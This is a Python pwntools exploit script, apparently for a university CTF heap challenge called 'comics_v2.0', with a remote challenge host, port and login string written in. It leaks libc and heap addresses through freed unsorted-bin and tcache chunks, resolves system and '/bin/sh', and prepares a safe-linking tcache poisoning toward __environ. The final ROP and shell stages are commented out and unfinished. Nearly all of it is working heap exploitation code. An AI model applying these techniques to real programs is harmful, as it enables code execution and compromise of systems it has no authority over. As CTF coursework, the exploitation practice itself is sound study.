from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./comics_v2.0"

LOCAL = True

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1214)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def add_comic(p, comic):
    p.recvuntil(b"> ")
    p.sendline(comic)
    p.recvuntil(b"bytes\n")

def edit_comic(p, comic_number, comic):
    p.recvuntil(b"> ")
    p.sendline(str(comic_number).encode())
    p.recvuntil(b"> ")
    p.send(comic)
    p.recvuntil(b"\n")

def delete_comic(p, comic_number):
    p.recvuntil(b"> ")
    p.sendline(str(comic_number).encode())

def read_comic(p, comic_number):
    p.recvuntil(b"> ")
    p.sendline(str(comic_number).encode())
    for i in range(3):
        p.recvline()
    comic = p.recvline()
    comic = comic[comic.find(b" " * 40 ):len(b" " * 40) + 8*4].strip()
    comic = u64(comic.ljust(8, b'\x00'))
    print(f'comic: {hex(comic)}')
    p.recvuntil(b"-----:\n")
    return comic

def protect(address, fwd_address):
    return (address >> 12) ^ fwd_address

# Create a larg comic to get unsorted bin when we free it, also add a small one after as a guard.
tcache_bins_size = 0x8
menu(p, 1)
add_comic(p, b"A" * 0x410)
menu(p, 1)
add_comic(p, b"B" * tcache_bins_size)
menu(p, 1)
add_comic(p, b"C" * tcache_bins_size)

# Leak a heap address from unsorted bins
menu(p, 4)
delete_comic(p, 0) # free comic 1
menu(p, 2)
glibc_leak = read_comic(p, 0)
glibc_base = (glibc_leak & ~0xfff) - 0x21a000
print(f'glibc_base: {hex(glibc_base)}')
libc_elf = ELF(libc)
libc_elf.address = glibc_base
system = libc_elf.symbols.system
print(f'system: {hex(system)}')
bin_sh_address = next(libc_elf.search(b"/bin/sh"))
print(f'bin sh address: {hex(bin_sh_address)}')

# Leak the heap address from tcache bins
menu(p, 4)
delete_comic(p, 1)
menu(p, 2)
heap_leak = read_comic(p, 1)

heap_leak = heap_leak << 12
print(f'heap base address: {hex(heap_leak)}')
memory_allocation = tcache_bins_size + 0x8 # Allocated size of the memory + metadata
tcache_size = 0x290 + 0x10
chunk_0 = heap_leak + tcache_size
print(f'chunk_0: {hex(chunk_0)}')
chunk_1 = chunk_0 + 0x418 + 0x8
print(f'chunk_1: {hex(chunk_1)}')
chunk_2 = chunk_1 + memory_allocation
print(f'chunk_2: {hex(chunk_2)}')

# Need to overflow a message to get the address of __environ into the next message,
# the print that message. For this we need the heap addresses and the tcache key.

environ = libc_elf.symbols.__environ
print(f'environ: {hex(environ)}')

target_address = protect(chunk_2, environ)
print(f'target_address: {hex(target_address)}')
menu(p, 4)
delete_comic(p, 2)
menu(p, 3)
# edit_comic(p, 2, p64(target_address))
edit_comic(p, 2, b"AAAAAAAA")
# menu(p, 1)
# add_comic(p, b'E' * tcache_bins_size)
#
# menu(p, 1)
# add_comic(p, b"")
# menu(p, 2)
# environ_leak = read_comic(p, 1)
# print(f'environ_leak: {hex(environ_leak)}')

# rip_address = environ - 0x8050cf8
# print(f'edit_rip_address: {hex(rip_address)}')

# libc_rop = ROP(libc, checksec=False)
#
# chain = [
#     libc_rop.ret.address + libc_elf.address,
#     libc_rop.rdi.address + libc_elf.address,
#     bin_sh_address,
#     system
#     ]

# menu(p, 1)
# add_comic(p, p64(system) + b'S' * 0x38)
#
# menu(p, 3)
# edit_comic(p, 2, b'/bin/sh\x00')
# menu(p, 4)
# delete_comic(p, 2)

p.interactive()